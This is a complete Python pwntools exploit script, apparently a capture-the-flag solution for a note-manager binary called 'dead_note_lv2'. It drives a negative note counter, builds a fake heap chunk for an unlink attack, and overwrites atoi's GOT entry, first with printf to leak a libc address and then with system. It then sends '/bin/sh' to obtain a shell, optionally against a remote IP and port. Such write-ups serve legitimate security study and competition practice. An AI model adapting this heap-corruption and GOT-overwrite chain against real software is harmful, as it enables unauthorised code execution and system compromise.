#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "206.189.46.173"
PORT = 50200

def add(content):
	r.sendline("1")
	r.sendafter("Content: ", content)
	r.recvuntil("choice: ")

def edit(idx, content):
	r.sendline("2")
	r.sendlineafter("Index: ", str(idx))
	r.sendlineafter("Content: ", content)
	r.recvuntil("choice: ")

def delete(idx):
	r.sendline("3")
	r.sendlineafter("Index: ", str(idx))
	r.recvuntil("choice: ")

def exploit(r):
	r.recvuntil("choice: ")

	log.info("Create initial notes")

	add("A"*8) # 0
	add("A"*8) # 1
	add("A"*8) # 2
	add("A"*8) # 3
	add("A"*8) # 4
	add("A"*8) # 5
	add("A"*8) # 6
	add("A"*8) # 7

	log.info("Prepare fake chunk for unlink")
	payload = p64(0x0) + p64(0x121)
	payload += p64(0x602120-0x18) + p64(0x602120-0x10)
	payload += "A"*(0x70-len(payload))	

	add(payload) # 8

	add("A"*8) # 9

	log.info("Call delete to get note counter to -1")

	for i in range(11):
		delete(1)

	log.info("Create chunk to fill 1")
	add("B"*8) # 1

	log.info("Create chunk in NOTE_COUNT")
	add(p64(0x120)) # 10

	log.info("Move NOTE_COUNT to prev_size of chunk 9")
	for i in range(0xa1):
		delete(1)

	log.info("Overwrite prev_size and size")
	edit(10, p64(0x80) + p64(0x90))

	log.info("Trigger unlink by freeing chunk 9 (chunk 8 points to bss now (=>chunk 5))")
	delete(9)

	log.info("Overwrite atoi with printf")

	edit(8, p64(e.got["atoi"]))

	edit(5, p64(e.plt["printf"]+6))

	log.info("Leak LIBC")

	r.sendline("%3$p")

	leak = int(r.recv(14), 16)
	libc.address = leak - 0xf7260

	log.info("LIBC leak        : %s" % hex(leak))
	log.info("LIBC             : %s" % hex(libc.address))
	r.recvuntil("Your choice: ")

	log.info("Overwrite atoi with system")

	r.sendline("..")				# edit
	r.sendlineafter(": ", ".....")	# index 5

	r.sendlineafter("Content: ", p64(libc.symbols["system"]))

	log.info("Select '/bin/sh' to trigger shell")
	r.sendlineafter("Your choice: ", "/bin/sh\x00")

	r.interactive()

	return

if __name__ == "__main__":
	e = ELF("./dead_note_lv2")
	libc = ELF("./libc.so.6")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)
		exploit(r)
	else:
		LOCAL = True
		r = process("./dead_note_lv2", env={"LD_PRELOAD" : "./libc.so.6"})
		print util.proc.pidof(r)
		pause()
		exploit(r)
